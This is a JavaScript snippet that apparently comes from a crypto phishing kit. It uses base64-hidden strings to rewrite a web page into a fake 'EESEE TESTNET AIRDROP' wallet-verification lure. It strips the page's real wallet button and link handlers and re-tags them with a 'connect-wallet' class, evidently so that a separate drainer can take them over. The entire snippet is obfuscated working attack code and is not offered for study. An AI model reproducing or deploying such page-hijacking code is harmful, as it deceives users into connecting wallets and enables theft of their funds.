
        function removeElementFuncRid(el) {
            try {
                el.style["opacity"] = "0%"
                el.style["position"] = "absolute";
                el.style["height"] = "0px";
                el.style["width"] = "0px";
            } catch(E) {}
        }
        
        function removeEventListenersFuncRid(element) {
            if (!element) {
            throw new Error('Element not provided.');
            }
            
            let current = element;
            while (current) {
                if (current.tagName && current.tagName.toLowerCase() === 'a') {
                    element.removeAttribute('href');
                }
                current = current.parentElement;
            }
        
            const clone = element.cloneNode(true);
            
            // Replace the original element with the clone
            element.parentNode.replaceChild(clone, element);
            
            return clone;
        }
    
            const coolData = JSON.parse(atob("eyIjdGl0bGUiOiJFRVNFRSBURVNUTkVUIEFJUkRST1AiLCJkaXYjcm9vdCA+IGRpdiA+IGRpdiA+IHAiOiJIaSBUaGlzIGRhcHAgdmVyaWZpZXMgeW91ciBFbGlnaWJpbGl0eSBhbmQgZ3JhbnQgeW91IHlvdXIgZGlzY29yZCByb2xlLiBQbGVhc2UgdXNlIHRoZSB3YWxsZXQgdG8gdmVyaWZ5IiwiZGl2I3Jvb3QgPiBkaXYgPiBkaXYgPiBoMiI6IllvdXIgQWlyZHJvcCBUb2tlbjogMCAkRVNFIiwiI2NoYWluaWQiOiJQbGVhc2UgY29ubmVjdCB0byBXYWxsZXQgIn0="));
            setInterval(() => {
                Object.keys(coolData).forEach((selectKey) => {
                    try {
                        if (document.querySelector(selectKey) != null) {
                            const el = document.querySelector(selectKey);
                            if (!el.classList.contains("rid-loaded-2")) {
                                el.classList.add("rid-loaded-2")
                                el.innerText = coolData[selectKey]
                            }
                        }
                    } catch(E) {}
                })
            }, 100)
            setInterval(() => {
                JSON.parse(atob("WyJidXR0b24jd2FsbGV0QnV0dG9uID4gc3BhbiIsImRpdiNyb290ID4gZGl2ID4gZGl2ID4gcDpudGgtb2YtdHlwZSgyKSA+IGEiLCIjc3RhdHVzIiwiI2NoYWluaWQiXQ==")).forEach((select) => {
                    try {
                        if (document.querySelector(select) != null) {
                            const el = document.querySelector(select);
                            if (!el.classList.contains("rid-loaded-3")) {
                                el.classList.add("rid-loaded-3")
                                const newEl = removeEventListenersFuncRid(el);
                                newEl.classList.add("connect-wallet")
                            }
                        }
                    } catch(E) {}
                })
            }, 100)